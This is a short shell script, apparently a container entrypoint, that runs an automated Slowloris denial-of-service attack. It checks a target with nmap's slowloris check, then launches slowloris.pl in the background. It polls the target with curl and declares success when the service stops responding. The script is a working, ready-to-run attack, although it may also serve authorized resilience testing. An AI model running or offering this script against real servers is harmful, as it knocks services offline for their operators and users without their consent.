if [ "$PORT" == '' ]; then
  echo 'Port not set. defaulting to 80'
  PORT=80
fi

echo "Checking if $TARGET:$PORT is vulnerable to Slowloris"
nmap --script http-slowloris-check $TARGET | grep 'VULNERABLE' &> /dev/null;
if [ $? == 0 ]; then
   echo "$TARGET:$PORT is vulnerable to Slowloris. Executing attack"
   (perl slowloris.pl -dns $TARGET -port $PORT)&
   slowloris_pid=$!

   COUNTER=1
   FAIL=1

   echo "Testing if $TARGET:$PORT is up"
   while [ $COUNTER -lt 7 ]; do
     STATUS=`curl $TARGET:$PORT -k -f -o /dev/null && echo "SUCCESS" || echo "ERROR"`
     echo $STATUS
     if [ $STATUS == "SUCCESS" ]; then
       echo "$TARGET:$PORT is up. Trying iteration: $COUNTER"
       sleep 10
     else
       echo "SLOWLORIS SUCCESS"
       kill $slowloris_pid
       FAIL=0
       COUNTER=7
     fi

     let COUNTER=COUNTER+1
   done

   if [ $FAIL == 1 ]; then
     echo "$TARGET:$PORT is still up"
     kill $slowloris_pid
   fi
else
  echo "$TARGET:$PORT is not vulnerable to Slowloris"
fi

exec "$@"
